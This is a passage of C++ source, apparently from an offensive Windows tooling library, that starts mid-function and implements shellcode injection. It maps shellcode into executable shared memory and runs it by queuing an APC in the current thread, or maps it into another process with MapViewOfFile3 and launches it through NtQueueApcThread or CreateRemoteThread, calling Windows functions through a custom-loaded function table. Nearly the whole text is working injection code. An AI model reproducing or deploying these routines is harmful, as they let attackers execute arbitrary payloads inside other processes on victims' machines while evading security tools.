        HANDLE hFileMapping = NULL;
        LPVOID pShellcodeExecutable = NULL;
        HANDLE hTargetThread = NULL;
        BOOL isSuccess = FALSE;

        // Create writable memory space
        hFileMapping = this->loadedFunctions.CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            NULL,
            PAGE_EXECUTE_READWRITE | SEC_COMMIT,
            0,
            shellcodeSize,
            NULL);
        if (hFileMapping == NULL)
            goto CLEANUP;

        pShellcodeExecutable = this->loadedFunctions.MapViewOfFile(
            hFileMapping,
            FILE_MAP_WRITE,
            0,
            0,
            0);
        if (pShellcodeExecutable == NULL)
            goto CLEANUP;

        // Copy shellcode into memory space
        CopyBuffer(pShellcodeExecutable, pShellcode, shellcodeSize);
        this->loadedFunctions.UnmapViewOfFile(pShellcodeExecutable);
        pShellcodeExecutable = NULL;

        // Turn memory space into executable
        pShellcodeExecutable = this->loadedFunctions.MapViewOfFile(
            hFileMapping,
            FILE_MAP_READ | FILE_MAP_EXECUTE,
            0,
            0,
            0);
        if (pShellcodeExecutable == NULL)
            goto CLEANUP;

        // Queue APC in self
        if (createNewThread)
        {
            __ALERTABLE_THREAD_FUNCTION_PARAMS params;
            params.pWinApiCustom = this;

            hTargetThread = this->CreateThreadCustom(
                (LPTHREAD_START_ROUTINE)__AlertableThreadFunction,
                &params);
        }
        else
            this->GetCurrentThreadHandleActual(&hTargetThread);

        if (hTargetThread == NULL)
            goto CLEANUP;

        if (this->loadedFunctions.NtQueueApcThread(
                hTargetThread,
                (PIO_APC_ROUTINE)pShellcodeExecutable,
                NULL,
                NULL,
                0) != 0)
            goto CLEANUP;

        // Run APC if queued in current thread
        if (createNewThread)
            isSuccess = TRUE; // No way to know if further execution is successful
        else
            isSuccess = (this->loadedFunctions.NtTestAlert() == 0);

        // Cleanup
    CLEANUP:
        if (hFileMapping != NULL)
            this->loadedFunctions.CloseHandle(hFileMapping);

        if (pShellcodeExecutable != NULL)
        {
            RtlZeroMemoryCustom((PBYTE)pShellcodeExecutable, shellcodeSize);
            this->loadedFunctions.UnmapViewOfFile(pShellcodeExecutable);
        }

        if (hTargetThread != NULL)
            this->loadedFunctions.CloseHandle(hTargetThread);

        return isSuccess;
    }
}

/*
Inject shellcode into another process

Copies input shellcode into a new executable memory.
*/
BOOL WinApiCustom::ProcessInjectShellcodeRemote(HANDLE hTargetProcess, HANDLE hTargetThread, BOOL isTargetAlreadyAlertable, LPVOID pShellcode, DWORD shellcodeSize)
{
    if (pShellcode != NULL && shellcodeSize != 0)
    {
        // Initialise variables
        HANDLE hFileMapping = NULL;
        LPVOID pShellcodeExecutableCurrentProcess = NULL;
        LPVOID pShellcodeExecutableTargetProcess = NULL;
        BOOL isSuccess = FALSE;

        // Create file mapping object
        hFileMapping = this->loadedFunctions.CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            NULL,
            PAGE_EXECUTE_READWRITE | SEC_COMMIT,
            0,
            shellcodeSize,
            NULL);
        if (hFileMapping == NULL)
            goto CLEANUP;

        // Copy shellcode to shared memory
        pShellcodeExecutableCurrentProcess = this->loadedFunctions.MapViewOfFile(
            hFileMapping,
            FILE_MAP_WRITE,
            0,
            0,
            0);
        if (pShellcodeExecutableCurrentProcess == NULL)
            goto CLEANUP;

        CopyBuffer(pShellcodeExecutableCurrentProcess, pShellcode, shellcodeSize);

        // Map this shared memory into target process (this contains executable shellcode now)
        pShellcodeExecutableTargetProcess = this->loadedFunctions.MapViewOfFile3(
            hFileMapping,
            hTargetProcess,
            NULL,
            0,
            0,
            0,
            PAGE_EXECUTE_READ,
            NULL,
            0);
        if (pShellcodeExecutableTargetProcess == NULL)
            goto CLEANUP;

        // For alertable target, use APC injection
        if (isTargetAlreadyAlertable)
        {
            isSuccess = (this->loadedFunctions.NtQueueApcThread(
                             hTargetThread,
                             (PIO_APC_ROUTINE)pShellcodeExecutableTargetProcess,
                             NULL,
                             NULL,
                             0) == 0);
        }
        // For non-alertable target, just create a new thread
        else
        {
            HANDLE hNewThread = this->loadedFunctions.CreateRemoteThread(
                hTargetProcess,
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)pShellcodeExecutableTargetProcess,
                NULL,
                0,
                NULL);
            isSuccess = (hNewThread != NULL);
        }

        // Cleanup
    CLEANUP:
        if (hFileMapping != NULL)
            this->loadedFunctions.CloseHandle(hFileMapping);

        if (pShellcodeExecutableCurrentProcess != NULL)
        {
            RtlZeroMemoryCustom((PBYTE)pShellcodeExecutableCurrentProcess, shellcodeSize);
            this->loadedFunctions.UnmapViewOfFile(pShellcodeExecutableCurrentProcess);
        }

        return isSuccess;
    }
}
